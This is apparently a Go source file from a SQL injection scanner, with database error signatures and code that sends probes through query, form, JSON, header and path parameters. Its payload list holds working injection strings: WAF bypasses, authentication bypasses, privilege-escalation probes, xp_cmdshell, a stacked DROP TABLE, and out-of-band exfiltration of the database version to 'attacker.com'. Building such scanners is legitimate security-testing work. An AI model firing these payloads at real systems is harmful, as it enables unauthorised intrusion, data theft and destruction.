package scanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"sleepywalker/internal/config"
	"sleepywalker/internal/learningdb"
	"sleepywalker/internal/utils"
)

// HeuristicResult holds the outcome of a local SQL injection probe.
type HeuristicResult struct {
	Entry         EntryPoint
	Suspicious    bool
	MatchedErrors []string // which DB error signatures were found
	TestPayload   string   // the payload that triggered the match
}

// sqlErrorSignatures maps database engines to strings commonly found in
// unhandled SQL error messages. Checked case-insensitively.
var sqlErrorSignatures = []struct {
	Engine  string
	Pattern string
}{
	// MySQL / MariaDB
	{"MySQL", "you have an error in your sql syntax"},
	{"MySQL", "warning: mysql"},
	{"MySQL", "unclosed quotation mark after the character string"},
	{"MySQL", "mysql_fetch"},
	{"MySQL", "mysql_num_rows"},
	{"MySQL", "supplied argument is not a valid mysql"},
	{"MySQL", "column count doesn't match value count"},
	{"MySQL", "data truncated for column"},
	{"MySQL", "unknown column"},
	{"MySQL", "table doesn't exist"},
	{"MySQL", "duplicate entry"},

	// PostgreSQL
	{"PostgreSQL", "pg_query():"},
	{"PostgreSQL", "pg_exec():"},
	{"PostgreSQL", "unterminated quoted string"},
	{"PostgreSQL", "syntax error at or near"},
	{"PostgreSQL", "invalid input syntax for"},
	{"PostgreSQL", "current transaction is aborted"},
	{"PostgreSQL", "permission denied for"},
	{"PostgreSQL", "relation \""},
	{"PostgreSQL", "column \""},

	// Microsoft SQL Server
	{"MSSQL", "microsoft ole db provider for sql server"},
	{"MSSQL", "unclosed quotation mark"},
	{"MSSQL", "[microsoft][odbc sql server driver]"},
	{"MSSQL", "mssql_query()"},
	{"MSSQL", "incorrect syntax near"},
	{"MSSQL", "conversion failed when converting"},
	{"MSSQL", "arithmetic overflow error"},
	{"MSSQL", "string or binary data would be truncated"},
	{"MSSQL", "transaction (process id"},
	{"MSSQL", "is not a recognized built-in function"},

	// Oracle
	{"Oracle", "ora-00933"},
	{"Oracle", "ora-01756"},
	{"Oracle", "ora-06512"},
	{"Oracle", "ora-00921"},
	{"Oracle", "ora-01476"},
	{"Oracle", "ora-01789"},
	{"Oracle", "ora-00936"},
	{"Oracle", "ora-29257"},
	{"Oracle", "oracle error"},
	{"Oracle", "quoted string not properly terminated"},
	{"Oracle", "missing expression"},

	// SQLite
	{"SQLite", "sqlite3::query"},
	{"SQLite", "sqlite_error"},
	{"SQLite", "sqlite.exception"},
	{"SQLite", "near \"\": syntax error"},
	{"SQLite", "unrecognized token"},
	{"SQLite", "no such table"},
	{"SQLite", "no such column"},
	{"SQLite", "sqlite3.operationalerror"},

	// IBM DB2
	{"DB2", "db2 sql error"},
	{"DB2", "sqlcode=-"},
	{"DB2", "com.ibm.db2"},
	{"DB2", "[ibm][cli driver]"},
	{"DB2", "db2_exec"},
	{"DB2", "sqlstate="},

	// SAP HANA
	{"HANA", "hdb error"},
	{"HANA", "sap hana"},
	{"HANA", "invalid column name"},
	{"HANA", "sql syntax error exception"},

	// Firebird / InterBase
	{"Firebird", "dynamic sql error"},
	{"Firebird", "isc_dsql_error"},
	{"Firebird", "firebird.error"},
	{"Firebird", "token unknown"},

	// Informix
	{"Informix", "informix odbc driver"},
	{"Informix", "com.informix.jdbc"},
	{"Informix", "ifx_"},
	{"Informix", "a syntax error has occurred"},

	// Sybase / SAP ASE
	{"Sybase", "sybase message"},
	{"Sybase", "incorrect syntax near"},
	{"Sybase", "sybsystemprocs"},
	{"Sybase", "adaptive server anywhere"},

	// MongoDB (NoSQL injection indicators)
	{"MongoDB", "mongoerror"},
	{"MongoDB", "unterminated string literal"},
	{"MongoDB", "command failed"},
	{"MongoDB", "errmsg"},

	// CockroachDB
	{"CockroachDB", "cockroach"},
	{"CockroachDB", "unexpected at or near"},
	{"CockroachDB", "target column"},

	// H2 Database
	{"H2", "org.h2.jdbc"},
	{"H2", "h2 database"},
	{"H2", "syntax error in sql statement"},

	// MariaDB specific
	{"MariaDB", "mariadb"},
	{"MariaDB", "got error 28"},

	// Generic JDBC / ODBC / drivers
	{"JDBC/ODBC", "[jdbc"},
	{"JDBC/ODBC", "[odbc"},
	{"JDBC/ODBC", "sql syntax error"},
	{"JDBC/ODBC", "sqlexception"},
	{"JDBC/ODBC", "system.data.sqlclient"},
	{"JDBC/ODBC", "pdo::query"},
	{"JDBC/ODBC", "pdoexception"},
	{"JDBC/ODBC", "adodb.field error"},
	{"JDBC/ODBC", "data.odbc.odbcexception"},
}

// testPayloads are probe strings injected into parameter values.
// Covers: syntax breaks, boolean, time-based, error-based, UNION,
// WAF bypass (comments/encoding/case/null bytes), DB-specific (MySQL, MSSQL, PostgreSQL,
// Oracle, SQLite, DB2, MongoDB, H2, Firebird, CockroachDB), stacked queries, OOB, NoSQL.
var testPayloads = []string{
	// ── Basic syntax breakers ──────────────────────────────────────
	"'",
	"\"",
	"`",
	"')",
	"')--",
	"\")",
	"\\",
	"';",
	"' --",

	// ── Boolean injection ──────────────────────────────────────────
	"1' OR '1'='1",
	"1\" OR \"1\"=\"1",
	"1 OR 1=1--",
	"' OR ''='",
	"1' OR '1'='1'/*",
	"1 OR 1=1#",
	"' OR 1=1-- -",
	"') OR ('1'='1",
	"1' OR 1=1 LIMIT 1-- -",
	"' OR 'x'='x",
	"1' OR '1'='1' OR ''='",
	"admin'--",
	"admin' #",
	"' OR 1=1/*",
	"1' OR 1#",

	// ── Time-based blind ───────────────────────────────────────────
	"'; WAITFOR DELAY '0:0:5'--",
	"1' AND SLEEP(5)-- -",
	"1'; SELECT pg_sleep(5)-- -",
	"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
	"1';WAITFOR DELAY '0:0:5'--",
	"1' AND BENCHMARK(10000000,MD5('a'))-- -",
	"1' OR SLEEP(5)-- -",
	"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
	"1';SELECT DBMS_LOCK.SLEEP(5) FROM dual-- -",
	"1' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(50000000))))-- -",

	// ── Error-based extraction ─────────────────────────────────────
	"1' AND 1=CONVERT(int,(SELECT @@version))--",
	"1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
	"1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -",
	"1' AND CAST((SELECT version()) AS int)-- -",
	"1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
	"1' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -",
	"1' AND GTID_SUBSET(CONCAT(0x7e,VERSION()),1)-- -",
	"1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))-- -",
	"1' HAVING 1=1-- -",
	"1' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT CONCAT(0x7e,VERSION()))a)b))-- -",

	// ── UNION-based ────────────────────────────────────────────────
	"' UNION SELECT NULL--",
	"1; SELECT 1--",
	"' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
	"1' UNION ALL SELECT NULL,NULL,CONCAT(0x716b7a71,0x41,0x7162787171)-- -",
	"' UNION SELECT 1,2,3,4-- -",
	"1' UNION SELECT @@version-- -",
	"-1 UNION SELECT 1,2,3-- -",
	"' UNION ALL SELECT NULL,NULL,NULL,NULL-- -",
	"' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",

	// ── WAF bypass: inline comments ────────────────────────────────
	"1'/*!50000OR*/'1'='1",
	"1'/**/OR/**/1=1-- -",
	"1'/*!UNION*//*!SELECT*/NULL-- -",
	"1'/**/ AND/**/1=1-- -",
	"/*!32302 1*/",
	"1' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ NULL-- -",
	"1'/**//*!50000UNION*//**//*!50000SELECT*//**/1-- -",

	// ── WAF bypass: encoding & case alternation ────────────────────
	"1' oR '1'='1",
	"1' AnD '1'='1'-- -",
	"1'%20OR%20'1'%3D'1",
	"1' OR 1=1-- -",
	"1' uNiOn SeLeCt NULL-- -",
	"1' UNI%4FN SEL%45CT NULL-- -",
	"1'+OR+'1'='1",
	"1'||'1'='1",

	// ── WAF bypass: double encoding & HPP ──────────────────────────
	"1%27%20OR%20%271%27%3D%271",
	"1' /*!00000OR*/ 1=1-- -",
	"%2527%2520OR%25201%253D1",
	"1'%250aOR%250a'1'='1",

	// ── WAF bypass: null bytes & whitespace tricks ─────────────────
	"1'%00OR%00'1'='1",
	"1'\tOR\t1=1-- -",
	"1'\nOR\n1=1-- -",
	"1' OR%0b1=1-- -",

	// ── Stacked queries ────────────────────────────────────────────
	"1'; DROP TABLE sw_test-- -",
	"1'; SELECT 1;-- -",
	"1'; EXEC xp_cmdshell('echo 1')-- -",
	"1';INSERT INTO sw_test VALUES(1)-- -",
	"1'; DECLARE @a int-- -",

	// ── DB-specific: IBM DB2 ───────────────────────────────────────
	"1' AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1)-- -",
	"1' UNION SELECT NULL FROM sysibm.sysdummy1-- -",
	"1'; VALUES CURRENT SERVER-- -",

	// ── DB-specific: Oracle ────────────────────────────────────────
	"1' AND 1=1 FROM dual-- -",
	"' UNION SELECT NULL FROM dual-- -",
	"' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -",
	"1' AND ROWNUM=1-- -",

	// ── DB-specific: MSSQL ─────────────────────────────────────────
	"1' AND @@SERVERNAME=@@SERVERNAME-- -",
	"' UNION SELECT @@version-- -",
	"1' UNION SELECT name FROM master..sysdatabases-- -",

	// ── DB-specific: PostgreSQL ────────────────────────────────────
	"1' AND current_database()=current_database()-- -",
	"' UNION SELECT version()-- -",
	"1' AND 1=1::int-- -",
	"$$;SELECT version()--$$",

	// ── DB-specific: SQLite ────────────────────────────────────────
	"1' AND sqlite_version()=sqlite_version()-- -",
	"' UNION SELECT sql FROM sqlite_master-- -",
	"' UNION SELECT name FROM sqlite_master WHERE type='table'-- -",

	// ── DB-specific: MongoDB (NoSQL) ───────────────────────────────
	"{\"$gt\":\"\"}",
	"{\"$ne\":null}",
	"[$ne]=1",
	"true, $where: '1 == 1'",
	"'; return true; var x='",
	"{\"$regex\":\".*\"}",

	// ── DB-specific: CockroachDB ───────────────────────────────────
	"1' AND version() LIKE '%CockroachDB%'-- -",

	// ── DB-specific: H2 ───────────────────────────────────────────
	"1'; CALL HASH('SHA256','test',1)-- -",
	"1' UNION SELECT H2VERSION()-- -",

	// ── DB-specific: Firebird ──────────────────────────────────────
	"1' AND 1=1 FROM rdb$database-- -",
	"' UNION SELECT CURRENT_USER FROM rdb$database-- -",

	// ── DB-specific: Informix ──────────────────────────────────────
	"1' AND 1=(SELECT DBSERVERNAME FROM systables WHERE tabid=1)-- -",
	"' UNION SELECT FIRST 1 tabname FROM systables-- -",

	// ── DB-specific: SAP HANA ──────────────────────────────────────
	"1' AND 1=(SELECT COUNT(*) FROM SYS.M_DATABASE)-- -",
	"' UNION SELECT CURRENT_USER FROM DUMMY-- -",

	// ── Out-of-band ────────────────────────────────────────────────
	"1' AND LOAD_FILE('\\\\\\\\attacker.com\\\\a')-- -",
	"1'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'-- -",

	// ── JSON/XML injection boundaries ──────────────────────────────
	"1' OR '1'='1' -- -",
	"<foo val=\"a]\" /><bar val=\"INJECTED\"/>",

	// ── Second-order / stored markers ──────────────────────────────
	"sw_probe'",
	"test<script>",
	"' || (SELECT '') || '",

	// ── Advanced: nested subquery / filter bypass ───────────────────
	"1' AND 1=(SELECT 1 FROM (SELECT 1)a WHERE 1=1 AND 1=1)-- -",
	"1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(database()) AS CHAR),0x7e)))FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
	"1' AND 1=(SELECT TOP 1 CAST(name AS int) FROM master..sysobjects WHERE xtype='U')-- -",
	"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % sw SYSTEM \"http://x.x\">%sw;]>'),'/l') FROM dual)||'",
	"1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_schema=DB_NAME()))-- -",

	// ── Advanced: conditional errors (blind) ───────────────────────
	"1' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -",
	"1' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)='1",
	"1' AND 1=(SELECT CASE WHEN(1=1) THEN CAST(1/0 AS int) ELSE 1 END)-- -",
	"1' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -",
	"1'||(CASE WHEN 1=1 THEN '' ELSE TO_CHAR(1/0) END)||'",

	// ── Advanced: order-by / group-by injection ────────────────────
	"1 ORDER BY 1-- -",
	"1 ORDER BY 100-- -",
	"1,(SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
	"IF(1=1,1,(SELECT 1 FROM mysql.user))",
	"(SELECT*FROM(SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c)",

	// ── Advanced: LIKE/BETWEEN/IN filter bypass ────────────────────
	"1' AND 1=1 AND 'a' LIKE 'a",
	"1' AND 1 BETWEEN 1 AND 1-- -",
	"1' AND 1 IN (1)-- -",
	"1' AND 1 NOT IN (2)-- -",
	"1' AND 'sw' LIKE 's%'-- -",

	// ── Advanced: scientific notation & type juggling ───────────────
	"1' AND 1e0=1e0-- -",
	"0e0' UNION SELECT NULL-- -",
	"1' AND 0x31=0x31-- -",
	".1' AND 1=1-- -",
	"1' AND 1.e(0)-- -",

	// ── Advanced: multiline / CRLF injection ───────────────────────
	"1'\r\nOR\r\n'1'='1",
	"1'%0d%0aOR%0d%0a1=1-- -",
	"1'%0aUNION%0aSELECT%0aNULL-- -",
	"1'%0a%0dAND%0a%0d1=1-- -",

	// ── Advanced: HTTP Parameter Pollution split ────────────────────
	"1'/*&id=*/OR/*&id=*/'1'='1",
	"1&id=1' OR '1'='1",

	// ── Advanced: JSON deserialization / type confusion ─────────────
	"{\"id\":{\"$gt\":0,\"$or\":[{},{}]}}",
	"{\"$where\":\"this.password.match(/.*/)!=null\"}",
	"{\"username\":{\"$regex\":\"^adm\"},\"password\":{\"$ne\":\"\"}}",
	"[{\"$lookup\":{\"from\":\"users\",\"localField\":\"x\",\"foreignField\":\"y\",\"as\":\"z\"}}]",

	// ── Advanced: chained/polyglot payloads ─────────────────────────
	"1'\"-- -/**/;%00",
	"'-var x=1-var y=2-'",
	"'+(select 1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",
	"\"XOR(if(now()=sysdate(),sleep(5),0))XOR\"",
	"if(now()=sysdate(),sleep(5),0)",
	"'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
	"';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
	"1);(SELECT * FROM (SELECT(SLEEP(5)))a)-- -",

	// ── Advanced: authentication bypass patterns ────────────────────
	"' OR 1=1 LIMIT 1 OFFSET 0-- -",
	"' OR 1=1 ORDER BY 1 DESC-- -",
	"admin' OR '1'='1'#",
	"admin')-- -",
	"') OR ('x')=('x",
	"' OR username LIKE '%",
	"' UNION SELECT 'admin','password'-- -",

	// ── Advanced: bit manipulation / math tricks ────────────────────
	"1' AND 1&1-- -",
	"1' AND ~~1-- -",
	"1'|1-- -",
	"1' AND 1 XOR 0-- -",
	"1' DIV 1-- -",
	"1' MOD 1-- -",

	// ── Advanced: DNS/HTTP exfiltration (no callback needed) ────────
	"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\a'))-- -",
	"1'; EXEC master..xp_dirtree('\\\\\\\\'+@@version+'.attacker.com\\\\x')-- -",
	"1' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)='1",

	// ── Advanced: privilege escalation probes ───────────────────────
	"1' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges-- -",
	"1' UNION SELECT user,file_priv FROM mysql.user-- -",
	"1' AND IS_SRVROLEMEMBER('sysadmin')=1-- -",
	"1' AND (SELECT super_priv FROM mysql.user WHERE user=CURRENT_USER() LIMIT 1)='Y'-- -",

	// ── Advanced: WAF bypass using concat/char functions ────────────
	"1' AND 1=1 AND CHAR(49)=CHAR(49)-- -",
	"1' AND CONCAT('s','w')='sw'-- -",
	"1' UNION SELECT CHR(65)||CHR(66) FROM dual-- -",
	"1'AND(1)=(1)AND'1'='1",
	"1' AND/**/'1'='1'-- -",
	"-1' UNION SELECT CONCAT_WS(0x3a,user(),database(),version())-- -",
}

// contextPriorityPayloads returns payloads reordered for the detected context.
// String-context payloads come first for string contexts, numeric for numeric.
func contextPriorityPayloads(base []string, ctx string) []string {
	switch ctx {
	case "header":
		// Header context: prefer string-quoted payloads.
		priority := []string{
			"Mozilla/5.0' AND '1'='1'-- -",
			"test' OR '1'='1'-- -",
			"'",
		}
		return prependUnique(priority, base)
	case "json":
		// JSON bodies: prefer string-quoted payloads.
		priority := []string{
			"'",
			"1' OR '1'='1",
			"\" OR \"1\"=\"1",
		}
		return prependUnique(priority, base)
	default:
		return base
	}
}

// prependUnique prepends priority payloads to base, skipping duplicates.
func prependUnique(priority, base []string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, p := range priority {
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	for _, p := range base {
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	return out
}

// effectiveSignatures returns the built-in SQL error signatures merged with
// any patterns learned from prior scans.
func effectiveSignatures() []struct{ Engine, Pattern string } {
	base := make([]struct{ Engine, Pattern string }, len(sqlErrorSignatures))
	for i, s := range sqlErrorSignatures {
		base[i] = struct{ Engine, Pattern string }{s.Engine, s.Pattern}
	}
	if db := learningdb.Global(); db != nil {
		for _, ls := range db.ErrorSignatures() {
			base = append(base, struct{ Engine, Pattern string }{ls.Engine, ls.Pattern})
		}
	}
	return base
}

// effectivePayloads returns the built-in test payloads merged with the
// top learned payloads for the given injection context, de-duplicated.
func effectivePayloads(injectionCtx string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, p := range testPayloads {
		if !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}
	if db := learningdb.Global(); db != nil {
		for _, p := range db.TopPayloads(injectionCtx, 10) {
			if !seen[p] {
				seen[p] = true
				out = append(out, p)
			}
		}
	}
	return out
}

// matchErrorSignaturesEnriched scans a response body for known SQL error patterns,
// including any patterns learned from prior scans.
func matchErrorSignaturesEnriched(body string) []string {
	lower := strings.ToLower(body)
	seen := make(map[string]bool)
	var matched []string
	for _, sig := range effectiveSignatures() {
		if strings.Contains(lower, sig.Pattern) && !seen[sig.Engine] {
			seen[sig.Engine] = true
			matched = append(matched, fmt.Sprintf("%s: %q", sig.Engine, sig.Pattern))
		}
	}
	return matched
}

// HeuristicScan probes every entry point with common SQL injection payloads
// and inspects the HTTP response body for known database error signatures.
// Uses concurrency when threads > 1. Respects cfg.MaxRequests budget via RateLimiter.
func HeuristicScan(cfg *config.Config, eps []EntryPoint, blockedTokens ...[]string) []HeuristicResult {
	client := cfg.BuildHTTPClient(10 * time.Second)
	threads := cfg.Threads
	if threads < 1 {
		threads = 1
	}

	// Fix #5/#6: create a rate limiter that gates every probe request.
	rl := utils.NewRateLimiter(cfg.RateDelay, cfg.MaxRequests)

	// Enhance 1: collect WAF-blocked tokens for payload filtering.
	var blocked []string
	if len(blockedTokens) > 0 {
		blocked = blockedTokens[0]
	}

	results := make([]HeuristicResult, len(eps))
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for i, ep := range eps {
		wg.Add(1)
		go func(idx int, ep EntryPoint) {
			defer wg.Done()
			sem <- struct{}{}        // acquire
			defer func() { <-sem }() // release

			hr := probeEntryPoint(client, cfg, ep, rl, blocked)
			results[idx] = hr
			if hr.Suspicious {
				log.Printf("[HEURISTIC] ⚠  Suspicious: %s %s [%s] (errors: %v, payload: %q)",
					ep.Method, ep.URL, ep.InjectionLoc, hr.MatchedErrors, hr.TestPayload)
			} else {
				log.Printf("[HEURISTIC] ✓  Clean: %s %s [%s]", ep.Method, ep.URL, ep.InjectionLoc)
			}
		}(i, ep)
	}
	wg.Wait()
	return results
}

// probeEntryPoint tries every payload against a single entry point,
// respecting the rate limiter for every request sent.
// Phase 1a: error-based detection (fast)
// Phase 1b: blind pre-screen (boolean differential) if no errors found
func probeEntryPoint(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter, blocked []string) HeuristicResult {
	db := learningdb.Global()

	// Skip if this URL+param was previously confirmed clean by the learning DB.
	if db != nil {
		host := extractHost(ep.URL)
		if db.IsFalsePositive(host, "", "", 5) {
			log.Printf("[HEURISTIC] ↩  Skipping (learning DB: known FP host): %s", ep.URL)
			return HeuristicResult{Entry: ep, Suspicious: false}
		}
	}

	// ── Phase 1a: error signature matching ──────────────────────────
	rawPayloads := effectivePayloads(ep.InjectionLoc)
	payloads := contextPriorityPayloads(rawPayloads, ep.InjectionLoc)

	// Enhance 1: filter out payloads containing WAF-blocked tokens.
	if len(blocked) > 0 {
		payloads = filterBlockedPayloads(payloads, blocked)
	}

	for _, payload := range payloads {
		if !rl.Wait() {
			log.Printf("[HEURISTIC] Request budget exhausted, stopping probes for %s", ep.URL)
			return HeuristicResult{Entry: ep, Suspicious: false}
		}
		body, statusCode, err := sendProbeRequestWithStatus(client, cfg, ep, payload)
		rl.RecordResponse(statusCode)
		if err != nil {
			continue
		}
		matched := matchErrorSignaturesEnriched(body)
		if len(matched) > 0 {
			if db != nil {
				db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", true)
			}
			return HeuristicResult{
				Entry:         ep,
				Suspicious:    true,
				MatchedErrors: matched,
				TestPayload:   payload,
			}
		}
		if db != nil {
			db.RecordPayloadAttempt(payload, ep.InjectionLoc, "", false)
		}
	}

	// ── Phase 1b: blind pre-screen (boolean) ───────────────────────
	if !rl.Wait() {
		return HeuristicResult{Entry: ep, Suspicious: false}
	}
	if blindPreScreen(client, cfg, ep, rl) {
		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (boolean differential detected)",
			ep.Method, ep.URL, ep.InjectionLoc)
		return HeuristicResult{
			Entry:         ep,
			Suspicious:    true,
			MatchedErrors: []string{"blind-sqli: boolean response differential"},
			TestPayload:   "boolean-differential",
		}
	}

	// ── Phase 1c: time-based pre-screen ─────────────────────────────
	if !rl.Wait() {
		return HeuristicResult{Entry: ep, Suspicious: false}
	}
	if timePreScreen(client, cfg, ep, rl) {
		log.Printf("[HEURISTIC] ⚠  Blind candidate: %s %s [%s] (timing anomaly detected)",
			ep.Method, ep.URL, ep.InjectionLoc)
		return HeuristicResult{
			Entry:         ep,
			Suspicious:    true,
			MatchedErrors: []string{"blind-sqli: timing anomaly"},
			TestPayload:   "time-based",
		}
	}

	return HeuristicResult{Entry: ep, Suspicious: false}
}

// filterBlockedPayloads removes payloads containing WAF-blocked tokens.
func filterBlockedPayloads(payloads []string, blocked []string) []string {
	var out []string
	for _, pl := range payloads {
		plUpper := strings.ToUpper(pl)
		skip := false
		for _, token := range blocked {
			if strings.Contains(plUpper, strings.ToUpper(token)) {
				skip = true
				break
			}
		}
		if !skip {
			out = append(out, pl)
		}
	}
	if len(out) == 0 {
		return payloads // don't filter everything away
	}
	return out
}

// blindPreScreen performs a boolean-based differential check to detect blind SQL injection.
// The key insight that eliminates false positives like YouTube:
//
//	Real blind SQLi:  baseline ≈ true_payload AND baseline ≠ false_payload
//	Random app:       baseline ≠ true_payload AND baseline ≠ false_payload
//
// We require the true condition to closely match the original baseline AND
// the false condition to differ from it. Both must hold consistently across
// 2 rounds to survive dynamic content (timestamps, ads, CSRF tokens).
func blindPreScreen(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) bool {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": "1"}
	}

	type boolPair struct{ truePl, falsePl, neutral string }

	// Choose boolean pairs appropriate for the injection location.
	var pairs []boolPair
	switch ep.InjectionLoc {
	case "header":
		// Header values are typically string context; neutral is a normal browser string.
		pairs = []boolPair{
			{"Mozilla/5.0' AND '1'='1'-- -", "Mozilla/5.0' AND '1'='2'-- -", "Mozilla/5.0"},
			{"test' AND '1'='1'-- -", "test' AND '1'='2'-- -", "test"},
			{"1' AND '1'='1'-- -", "1' AND '1'='2'-- -", "1"},
		}
	default:
		// Numeric and string contexts for query/body/json params.
		pairs = []boolPair{
			{"1 AND 1=1-- -", "1 AND 1=2-- -", "1"},
			{"1 AND 1=1#", "1 AND 1=2#", "1"},
			{"1' AND '1'='1'-- -", "1' AND '1'='2'-- -", "1"},
			{"1' AND '1'='1'#", "1' AND '1'='2'#", "1"},
		}
	}

	const rounds = 2

	for targetKey := range params {
		for _, pair := range pairs {
			// Fetch baseline using the original param value, or the pair's neutral.
			neutralVal := ep.Params[targetKey]
			if neutralVal == "" {
				neutralVal = pair.neutral
			}
			baseline := fetchParamWithPayload(client, cfg, ep, targetKey, neutralVal)
			if baseline == "" {
				continue
			}

			trueSimilarCount := 0
			falseDifferCount := 0

			for i := 0; i < rounds; i++ {
				trueBody := fetchParamWithPayload(client, cfg, ep, targetKey, pair.truePl)
				falseBody := fetchParamWithPayload(client, cfg, ep, targetKey, pair.falsePl)
				if trueBody == "" || falseBody == "" {
					break
				}

				trueSim := htmlStripJaccard(baseline, trueBody)
				falseSim := htmlStripJaccard(baseline, falseBody)

				if trueSim > 0.85 {
					trueSimilarCount++
				}
				if falseSim < 0.70 {
					falseDifferCount++
				}
			}

			if trueSimilarCount == rounds && falseDifferCount == rounds {
				log.Printf("[HEURISTIC]   Blind pre-screen: true≈baseline AND false≠baseline (loc=%s param=%s payload=%s)",
					ep.InjectionLoc, targetKey, pair.truePl)
				return true
			}
		}
	}
	return false
}

// fetchParamWithPayload sends a request injecting payload into a specific parameter only,
// using the correct method and content-type for the entry point.
func fetchParamWithPayload(client *http.Client, cfg *config.Config, ep EntryPoint, targetKey, payload string) string {
	body, _, _ := fetchParamWithPayloadWithStatus(client, cfg, ep, targetKey, payload)
	return body
}

// fetchParamWithPayloadWithStatus sends a request injecting payload into a specific parameter only,
// using the correct method and content-type for the entry point, and returns body, status code, and error.
// Supports GET, POST, PUT, PATCH, DELETE, header, json, body, multipart, and path injection.
func fetchParamWithPayloadWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, targetKey, payload string) (string, int, error) {
	var req *http.Request
	var err error

	method := ep.Method
	if method == "" {
		if ep.InjectionLoc == "json" || ep.InjectionLoc == "body" || ep.InjectionLoc == "multipart" {
			method = "POST"
		} else {
			method = "GET"
		}
	}

	switch ep.InjectionLoc {
	case "header":
		req, err = http.NewRequest(method, ep.URL, nil)
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		req.Header.Set(targetKey, payload)

	case "json":
		jsonBody := make(map[string]interface{})
		for k, v := range ep.Params {
			if k == targetKey {
				jsonBody[k] = payload
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				jsonBody[k] = neutral
			}
		}
		b, err := json.Marshal(jsonBody)
		if err != nil {
			return "", 0, err
		}
		req, err = http.NewRequest(method, ep.URL, bytes.NewReader(b))
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}

	case "body", "multipart":
		form := url.Values{}
		for k, v := range ep.Params {
			if k == targetKey {
				form.Set(k, payload)
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				form.Set(k, neutral)
			}
		}
		req, err = http.NewRequest(method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}

	case "path":
		injectURL := ep.URL
		if len(ep.PathSegments) > 0 {
			targetSeg := targetKey
			found := false
			for _, seg := range ep.PathSegments {
				if seg == targetKey {
					targetSeg = seg
					found = true
					break
				}
			}
			if !found {
				targetSeg = ep.PathSegments[0]
			}
			injectURL = strings.Replace(ep.URL, "/"+targetSeg, "/"+url.PathEscape(payload), 1)
		} else {
			u, parseErr := url.Parse(ep.URL)
			if parseErr == nil {
				path := u.Path
				if path != "" && path != "/" {
					lastSlash := strings.LastIndex(path, "/")
					if lastSlash >= 0 {
						u.Path = path[:lastSlash+1] + url.PathEscape(payload)
						injectURL = u.String()
					}
				}
			}
		}
		req, err = http.NewRequest(method, injectURL, nil)
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}

	default: // query
		u, err := url.Parse(ep.URL)
		if err != nil {
			return "", 0, err
		}
		q := u.Query()
		for k, v := range ep.Params {
			if k == targetKey {
				q.Set(k, payload)
			} else {
				neutral := v
				if neutral == "" {
					neutral = "1"
				}
				q.Set(k, neutral)
			}
		}
		u.RawQuery = q.Encode()
